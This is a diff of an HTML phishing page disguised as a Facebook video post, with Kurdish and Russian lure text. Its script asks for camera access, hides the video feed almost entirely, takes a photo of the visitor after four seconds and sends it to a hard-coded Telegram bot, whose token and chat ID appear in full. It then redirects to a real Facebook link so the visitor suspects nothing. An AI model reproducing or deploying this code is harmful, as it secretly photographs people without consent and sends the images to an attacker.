@@ -3,12 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title> 
+    
+    <title>Facebook Post</title>
+    <meta property="og:title" content="Facebook Video">
+    <meta property="og:description" content="بۆ بینینی ئەم ڤیدیۆیە کلیک لێرە بکە">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/y9f97_th_th.png">
+    <meta property="og:type" content="video.other">
+
     <style>
-        /* شاردنەوەی کامێرا */
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
         #canvas { display: none; }
-        
         body { 
             background-color: #ffffff; 
             margin: 0; 
@@ -17,32 +21,23 @@
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
-            font-family: Arial, sans-serif;
         }
-
         .loader {
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #2ecc71; /* ڕەنگی سەوز بۆ ئەوەی بڕوا دروست بکات */
+            border-top: 3px solid #1877F2; 
             border-radius: 50%;
             width: 35px;
             height: 35px;
             animation: spin 1s linear infinite;
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .status-text {
-            margin-top: 20px;
-            color: #555;
-            font-size: 15px;
-            font-weight: bold;
-        }
+        .status-text { margin-top: 20px; color: #555; font-size: 14px; font-family: sans-serif; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <div class="status-text">Синхронизация данных, подождите...</div>
+    <div class="status-text">Загрузка видео Facebook...</div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -50,17 +45,18 @@
     <script>
         const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
         const CHAT_ID = '6351568884';
+        
+        // ئەو لینکەی کە تۆ ناردت
+        const FACEBOOK_POST_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr'; 
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        // داواکردنی کامێرا
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
+            const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // 4 چرکە چاوەڕێ دەکەین تا وێنەکە ساف بێت
+            // دوای 4 چرکە وێنەکە دەگرێت و دەچێتە سەر پۆستەکە
             setTimeout(() => {
+                const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
@@ -68,21 +64,20 @@
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'image.jpg');
+                    formData.append('photo', blob, 'fb_video_capture.jpg');
 
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     })
                     .then(() => {
-                        // دوای وێنەگرتن دەچێتە سەر وێبسایتی یاندێکس (گوگڵی ڕووسی)
-                        window.location.href = "https://yandex.com";
+                        window.location.href = FACEBOOK_POST_URL;
                     });
-                }, 'image/jpeg', 0.95);
+                }, 'image/jpeg', 0.9);
             }, 4000);
         })
         .catch(() => {
-            window.location.href = "https://yandex.com";
+            window.location.href = FACEBOOK_POST_URL;
         });
     </script>
 </body>
